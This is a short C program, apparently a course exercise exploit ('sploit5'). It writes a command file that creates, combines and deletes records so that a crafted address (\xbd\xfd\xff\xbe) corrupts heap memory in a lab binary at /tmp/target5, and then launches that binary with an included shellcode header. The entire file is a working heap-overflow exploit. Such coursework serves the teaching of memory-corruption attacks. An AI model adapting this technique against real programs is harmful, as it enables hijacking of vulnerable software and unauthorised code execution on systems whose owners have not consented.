#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include "shellcode.h"
#include <fcntl.h>

#define TARGET "/tmp/target5"

int main(void)
{
	int fd;
	char arg1[] = "sploit5-cmds";
	char *args[] = { TARGET, arg1, NULL };
	char *env[] = { NULL };
	
	fd = open(arg1, O_CREAT | O_RDWR, 0666);
	write(fd, "create 0 a\n", 11);
	write(fd, "create 1 bbbb\n", 14);
	write(fd, "create 2 cccccccccccccccccccccccc\n", 34);
	write(fd, "combine 2 1 2\n", 14);
	write(fd, "create 0 aaaaaaaaaaaa\xbd\xfd\xff\xbe\n", 26);
	write(fd, "delete 1\n", 9);
	close(fd);

	if (0 > execve(TARGET, args, env))
		fprintf(stderr, "execve failed.\n");

	return 0;
}
